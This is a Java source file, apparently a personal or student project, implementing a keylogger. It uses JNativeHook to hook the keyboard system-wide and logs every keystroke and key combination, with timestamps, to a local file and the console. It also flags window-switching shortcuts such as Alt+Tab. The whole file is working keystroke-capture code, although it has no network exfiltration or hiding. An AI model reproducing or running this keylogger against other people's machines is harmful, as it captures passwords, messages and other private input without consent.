// to complile: javac -cp C:\Users\Alpha\Desktop\Keylogger\Keylogger\lib\jnativehook-2.2.2.jar Keylogger.java
// to run(not working): java -cp C:\Users\Alpha\Desktop\Keylogger\Keylogger\lib\jnativehook-2.2.2.jar. Keylogger
package khushi;

import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashSet;
import java.util.Set;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class Keylogger implements NativeKeyListener
{
    private FileWriter output;
    private Set<String> currentlyPressedKeys = new HashSet<>(); // to avoid duplicate key presses, same as sets in math

    public Keylogger()
    {
        try
        {
            // Formatting the current date and time. We can't use the fn below as it is of
            // incorrect format.
            LocalDateTime now = LocalDateTime.now();
            DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd-HH-mm-ss");
            String dateTime = now.format(formatter);

            // Constructing the directory path and filename
            String directoryPath = "logs/";
            String fileName = directoryPath + dateTime + "_keylog.txt";

            // Checking if the directory exists. If not, create it.
            File directory = new File(directoryPath);
            if (!directory.exists())
            {
                directory.mkdirs();
            }

            output = new FileWriter(fileName, true); // true means the file is appended
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    public static void main(String[] args)
    {
        System.out.println("Keylogger started");
        try
        {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e)
        {
        }
        GlobalScreen.addNativeKeyListener(new Keylogger());
    }

    @Override
    public void nativeKeyPressed(NativeKeyEvent arg0)
    {
        String keyText = NativeKeyEvent.getKeyText(arg0.getKeyCode());
        currentlyPressedKeys.add(keyText);
        checkForKeyCombinations();

        String dateTime = getCurrentDateTime();

        if (currentlyPressedKeys.size() > 1)// More than one key is pressed
        {
            String combinedKeys = String.join(" + ", currentlyPressedKeys);
            String logText = dateTime + " - Combination of keys: " + combinedKeys + " has been pressed.\n";
            System.out.println(logText);
            writeToFile(logText);
        } else
        {
            String logText = dateTime + " - Pressed this key: " + keyText + "\n";
            System.out.println(logText);
            writeToFile(logText);
        }
    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent arg0)
    {
        String keyText = NativeKeyEvent.getKeyText(arg0.getKeyCode());
        currentlyPressedKeys.remove(keyText);
    }

    private void writeToFile(String text)
    {
        try
        {
            output.write(text);
            output.flush();
        } catch (IOException e)
        {
            e.printStackTrace();
        }
    }

    private String getCurrentDateTime()
    {
        LocalDateTime now = LocalDateTime.now();
        DateTimeFormatter formatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
        return now.format(formatter);
    }

    private void checkForKeyCombinations()
    {
        if (currentlyPressedKeys.contains("Alt") && currentlyPressedKeys.contains("Tab"))
        {
            System.out.println("Combination of Alt + Tab keys have been used. User might have switched windows.");
        } else if (currentlyPressedKeys.contains("Meta") && currentlyPressedKeys.contains("Tab"))
        {
            // The exact name for the Windows key might differ depending on the library and
            // OS. It's often "Windows" or "Meta".
            System.out.println("Combination of Win + Tab keys have been used. User might have switched windows.");
        }
    }

}
